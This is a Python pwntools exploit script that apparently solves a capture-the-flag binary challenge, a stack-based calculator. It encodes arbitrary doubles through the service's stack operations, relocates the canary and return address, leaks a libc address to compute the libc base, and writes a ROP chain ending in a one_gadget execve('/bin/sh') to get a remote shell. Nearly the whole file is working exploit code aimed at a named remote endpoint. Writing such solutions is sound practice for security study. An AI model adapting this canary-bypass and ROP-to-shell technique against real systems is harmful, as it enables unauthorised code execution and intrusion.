# usage:
#
#  python3 sol.py     # for network chal
#  python3 sol.py 1   # for local binary
#


from pwn import *
import math

######
## I/O
######

# send and filter reply
def sendCode(r, code):
   msg = "\n".join( [c  for c in code] ) + "\n"
   r.send(msg.encode())
   for _ in range(len(code)):   r.recvuntil(b"choice:" )


def readValue(r, idx):
  r.send( f"9\n{idx}\n".encode() )
  r.recvuntil( b"value is")
  v_dbl = float( r.recvuntil(b"\n").strip() )
  r.recvuntil( b"quit" )
  return v_dbl


# convert a double to its byte representation
def double2bytes(x):
   return int.from_bytes(struct.pack('<d', x), "little")

def long2double(v):
   return struct.unpack('<d', p64(v))[0]


#######
# SOLVER
########

# construct d0^k for k > 0, where d0 = pi - e = 0.423...
#
def codeD0ToK(k):
   assert k > 0

   code =  "1817"  #pi,e, rest
   code += "532"   #d0=pi-e, rest
   code += "14"    #d0,d0, rest

   d0 = math.pi - math.e

   # stack[0] will be d2k, stack[1] will be d
   #
   # cannot load d=1, so use k-1 for odd, k-2 for even

   if (k & 1) == 1:
      d2k, d = d0, d0
      k -= 1
   else:
      code += "63"
      d2k, d = d0, d0*d0
      k -= 2
   while True:
      if (k & 1) != 0:
         code += "363"
         d *= d2k
      k >>= 1
      if k == 0: break
      code += "14632"
      d2k *= d2k
   
   code += "2"        # d0^k, rest
   return d, code


# construct input that builds 'x' as a float,  |x| <= O(1) assumed
#
def codeNumber(x):

   # let d0 = p - e ~= 0.4
   # build d0^k  s.t.   d0^k <= |x| < d0^(k-1)

   d0 = math.pi - math.e
   k = int( math.ceil( math.log(abs(x)) / math.log(d0) ) )   #rounds up
   print(f"k={k}")

   d, code = codeD0ToK(k)     # d=d0^k, rest

   assert d < abs(x)

   # build x
   # stack[0]: d, stack[1]: res

   code += "13"
  
   res = 0.
   while True:
      diff = x - res
      if diff == 0.:   break
      if abs(diff) < d:   # this branch can only be taken after 1st round, so res != 0
         k, fac = 1, d0
         while abs(diff) < d * fac:
           k += 1
           fac *= d0
         fac, codePart = codeD0ToK(k)
         d *= fac
         code += codePart + "632" 
      if diff > 0.:
        res += d
        code += "343"
      else:
        res -= d
        code += "353"

   #print(res)

   code += "2"

   return code




###
# SOLVER
#
# memory layout, in terms of double (8-byte) indices inside main loop
# rsp[0] - rsp[10]: array
# rsp[11]: canary
# rsp[12]: rbx
# rsp[13]: rbp
# rsp[14]: r12
# rsp[15]: retaddr
#
###


LOCAL = len(sys.argv) > 1
if LOCAL:
   #r = process(["chal"])
   r = process(["transcendental-patched"])
   print(f"PID={r.pid}")
#else:   r = remote("127.0.0.1", "9101")
else:   r = remote("transcendental.bctf23-codelab.kctf.cloud", "1337")

# STEP 1: move canary and retaddr into workspace
#
code =  "71"*11    
code += "7"       # stack = 12*pi, canary, rbx, r12, retaddr (rbp=0 quashed)
code += "2"*12    # stack = canary, rbx, r12, retaddr...
code += "32"*2
code += "3"

sendCode(r, code)

# at this point stack[0] = retaddr
#               stack[1] = canary


# STEP 2: deduce libc_start_main retaddr
#         and infer libc offset
#
#
addr0_dbl = readValue(r, 0)       # most significant 5 or so hex digits
addr0 = double2bytes(addr0_dbl)
print(f"ADDR0: {addr0_dbl} -> {hex(addr0)}")

# reconstruct extracted approximate value, and subtract
code = codeNumber(addr0_dbl)
print(code)
sendCode(r, code + "5")

# read difference
delta0_dbl = readValue(r, 0)
delta0 = double2bytes(delta0_dbl)
print(f"DELTA0: {delta0_dbl} -> {hex(delta0)}")

# combine for first 9 or so significant hex digits (remaining 3 are constant)
if delta0 < 2**63:   addr1 = addr0 - delta0
else:  addr1 = addr0 + delta0 - 2**63
print(f"ADDR1: {hex(addr1)}")

libc = ELF("libc.so.6")
libc_ret = libc.symbols["__libc_start_main"] + 243    # offset depends on libc version
#print(hex(libc_ret))

libc_offset = (((addr1 - libc_ret) + 0x800) >> 12) << 12
print(f"LIBC OFFS: {hex(libc_offset)}")



# STEP 3: place rop chain
#
# onegadget:
'''
0xe3b2e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b31 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b34 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''
#
# use rsi=0, rdx=0
#
# gadgets:
#   0x02604f : pop rsi ; ret
#   0x0ee414 : add esi, esi ; ret
#   0x040ff8 : xor eax, eax ; ret
#   0x041f8b : and rdx, rax ; movq xmm0, rdx ; ret

onegadget = 0x0e3b34
g1 = 0x02604f
g2 = 0x0ee414
g3 = 0x040ff8
g4 = 0x041f8b

# ROP chain:
chain = [g1, 0x80000000 - libc_offset, g2, g3, g4, onegadget]

code = "22"   # move canary to top

for gadg in chain[::-1]:
   code += codeNumber( long2double(libc_offset + gadg) )
   code += "3"

code += "173"*3   # pops before ret
code += "17"*11   # move canary + chain to place
code += "q"       # quit

sendCode(r, code)

r.sendline(b"ls")


r.interactive()
